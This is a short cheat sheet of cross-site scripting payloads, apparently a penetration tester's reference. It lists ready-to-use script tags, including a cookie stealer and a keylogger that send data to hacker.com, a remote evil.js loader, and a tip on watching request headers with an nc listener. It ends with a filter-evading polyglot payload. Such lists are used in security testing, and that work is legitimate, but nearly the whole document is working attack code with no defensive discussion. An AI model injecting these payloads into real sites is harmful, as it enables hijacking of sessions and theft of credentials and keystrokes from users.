# Cross Site Scripting
 
#### Generic proof of concept payload  
`<script>alert(document.domain);</script>`

#### Cookie stealer  
`<script>fetch('https://hacker.com/steal?cookie=' + btoa(document.cookie));</script>`

#### Key logger  
`<script>document.onkeypress = function(e) { fetch('https://hacker.com/log?key=' + btoa(e.key) );}</script>`

#### External hacker-controlled script execution  
`<script src='http://hacker.com/evil.js'></script>`  
Trick: with nc listener, all HTTP request headers can also be seen when web server fetches remote js, possibly detecting other vulns, maybe CORS?

### Blind XSS
`https://xsshunter.com/`  

### Polyglots
``jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e``
